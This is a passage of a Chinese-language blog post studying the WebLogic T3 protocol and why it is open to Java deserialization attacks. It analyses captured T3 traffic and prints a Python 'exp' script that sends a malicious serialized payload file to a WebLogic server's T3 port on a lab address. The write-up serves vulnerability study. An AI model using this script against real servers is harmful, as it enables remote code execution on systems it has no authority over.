+<p><img src="/imgs/image-20200721163750014.png" alt="image-20200721163750014"></p>
+<p>至此，我们成功利用调用了weblogic的T3下的服务。</p>
+<h2 id="0x03-WebLogic-T3和反序列化的关系？"><a href="#0x03-WebLogic-T3和反序列化的关系？" class="headerlink" title="0x03 WebLogic T3和反序列化的关系？"></a>0x03 WebLogic T3和反序列化的关系？</h2><p>学习RMI的时候我们已经了解<a href="/2020/06/14/Java%20RMI/#0x03-扩展">RMI的原理</a>：</p>
+<ol>
+<li>将可以远程调用的对象进行序列化，然后绑定到RMI Server（被调方，运行者）中作为存根（stub）</li>
+<li>RMI Client 会先去下载stub<strong>反序列化</strong>然后发起client调用，RMI 底层（RMI Interface Layer &amp; Transport Layer）会讲请求参数封装发送到RMI Server </li>
+<li>RMI Server 接收到封装的参数，传递给骨架（skeleton），由桩解析参数并且以参数调用对应的存根（stub）方法。</li>
+<li>存根方法在RMI Server执行完毕之后，返回结果将被RMI底层封装并传输给RMI Client（也就是主调方，调用者）</li>
+</ol>
+<p>可以看出：RMI是基于序列化和反序列化的，远程对象在进行注册时，序列化作为存根，客户端调用的时候会把<strong>序列化后的对象进行反序列化再调用</strong>，T3一样的道理，所以同样会在客户端调用服务的时候进行反序列化获取对象。到这一步搞懂了为什么webLogic T3会被爆出反序列化漏洞。</p>
+<img src="/imgs/image-20200609170552480.png" alt="image-20200609170552480" style="zoom:67%;" />
+
+<h2 id="0x04-怎么构造payload并通过T3执行命令？"><a href="#0x04-怎么构造payload并通过T3执行命令？" class="headerlink" title="0x04 怎么构造payload并通过T3执行命令？"></a>0x04 怎么构造payload并通过T3执行命令？</h2><p>构造恶意数据并发送想要先分析如何与T3建立连接并发送包。</p>
+<h3 id="分析T3包"><a href="#分析T3包" class="headerlink" title="分析T3包"></a>分析T3包</h3><p>构造T3包，首先分析流量，执行client.java，用wireshark进行抓包，并跟踪TCP流，下图是以ASCII码形式显示</p>
+<p><img src="/imgs/image-20200721203221667.png" alt="image-20200721203221667"></p>
+<p>红色是本地（192.168.116.1）发送的包，蓝色是接收的来自服务器（192.168.116.140）的包，我们一一分析</p>
+<p>首先和目标服务器建立连接，然后本地发送T3协议头，由上图观察可以注意到这里结尾是两个\n</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t3 10.3.6\nAS:255\nHL:19\n\n</span><br></pre></td></tr></table></figure>
+
+<p>服务器监听，收到请求并发送数据，我们可以得到服务器的版本12.2.1.4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HELO:12.2.1.4.false</span><br><span class="line">AS:2048</span><br><span class="line">HL:19</span><br><span class="line">MS:10000000</span><br><span class="line">PN:DOMAIN</span><br></pre></td></tr></table></figure>
+
+<p>分析到这里我不是很懂后面部分是怎么进行，参考了下<a href="http://drops.xmd5.com/static/drops/web-13470.html" target="_blank" rel="noopener">修复weblogic的JAVA反序列化漏洞的多种方法#对JAVA序列化数据进行解析</a>，通过<code>ac ed 00 05</code>可以筛选出请求的反序列化部分</p>
+<p><img src="/imgs/image-20200721212800433.png" alt="image-20200721212800433"></p>
+<p>自己也跟着实践了下，用之前学习Java序列化的例子来构造了一个序列化数据，发现确实是以<code>aced0005</code>开始</p>
+<p><img src="/imgs/image-20200721214315503.png" alt="image-20200721214315503"></p>
+<p><img src="/imgs/image-20200721214719132.png" alt="image-20200721214719132"></p>
+<p>接着继续跟着学习，发现优秀的表哥已经把这个分析的很明白了</p>
+<p>分析下图发送的包由三部分构成：</p>
+<ol>
+<li>包第一部分-由包的大小和其他数据组成。整个包的大小是前四个字节<code>00 00 02 7c</code></li>
+<li>第二部分以<code>ac ed 00 05</code>开始的序列化部分</li>
+<li>第三部分以<code>ac ed 00 05</code>开始的序列化部分</li>
+</ol>
+<p><img src="/imgs/image-20200721215748210.png" alt="image-20200721215748210"></p>
+<h3 id="构造T3包"><a href="#构造T3包" class="headerlink" title="构造T3包"></a>构造T3包</h3><p>构造包，表哥给了两种方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种生成方式为，将前文所述的weblogic发送的JAVA序列化数据的第二到三部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</span><br><span class="line">第二种生成方式为，将前文所述的weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</span><br></pre></td></tr></table></figure>
+
+<p>为了简单，我选择第二种方法进行构造，即将 <strong>包第一部分-由包的大小和其他数据组成</strong> 和 <strong>恶意序列化数据</strong> 拼接</p>
+<p>参考脚本，经过上面的分析，可以总结下流程</p>
+<ol>
+<li>用socket建立TCP连接</li>
+<li>发送T3协议头</li>
+<li>将恶意数据按照第二种方法拼接在第一部分之后</li>
+<li>获取整个包的长度，然后替换第一部分的前四个字节</li>
+<li>最后发送数据</li>
+</ol>
+<p>我们便可以构造出通用的T3包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 适用于python2和python3</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(ip, port, file)</span>:</span></span><br><span class="line">    t3_header = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span></span><br><span class="line">    host = (ip, int(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">'016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">'%s%s'</span> % (<span class="string">'&#123;:08x&#125;'</span>.format(len(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp(<span class="string">'192.168.116.132'</span>,<span class="string">'7001'</span>,<span class="string">'poc.ser'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-参考链接："><a href="#0x05-参考链接：" class="headerlink" title="0x05 参考链接："></a>0x05 参考链接：</h2><p><a href="https://docs.oracle.com/cd/E11035_01/wls100/client/t3.html" target="_blank" rel="noopener">Developing T3 Clients</a></p>
+<p><a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI150" target="_blank" rel="noopener">How to Implement WebLogic RMI</a></p>
+<p><a href="https://blog.csdn.net/natureice/article/details/6104885" target="_blank" rel="noopener">关于引用WebLogic.jar时遇到NoClassDefFoundError问题的解决方法</a></p>
+<p><a href="https://blog.csdn.net/u012478275/article/details/99624506" target="_blank" rel="noopener">wireshark解析TCP的几种状态</a></p>
+<p><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#commons" target="_blank" rel="noopener">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/web-13470.html" target="_blank" rel="noopener">修复weblogic的JAVA反序列化漏洞的多种方法#对JAVA序列化数据进行解析</a></p>
+<p><a href="https://blog.csdn.net/mafucan/article/details/106605064" target="_blank" rel="noopener">Java反序列化个人总结</a></p>
+<p><a href="https://docs.python.org/zh-cn/2.7/library/binascii.html" target="_blank" rel="noopener">二进制和 ASCII 码互转</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-什么是T3协议？"><span class="toc-number">2.</span> <span class="toc-text">0x01 什么是T3协议？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-怎么调用T3服务？"><span class="toc-number">3.</span> <span class="toc-text">0x02 怎么调用T3服务？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-WebLogic-T3和反序列化的关系？"><span class="toc-number">4.</span> <span class="toc-text">0x03 WebLogic T3和反序列化的关系？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-怎么构造payload并通过T3执行命令？"><span class="toc-number">5.</span> <span class="toc-text">0x04 怎么构造payload并通过T3执行命令？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析T3包"><span class="toc-number">5.1.</span> <span class="toc-text">分析T3包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造T3包"><span class="toc-number">5.2.</span> <span class="toc-text">构造T3包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考链接："><span class="toc-number">6.</span> <span class="toc-text">0x05 参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&text=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&is_video=false&description=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WebLogic系列漏洞学习之T3：T3协议&body=Check out this article: http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&name=WebLogic系列漏洞学习之T3：T3协议&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&t=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
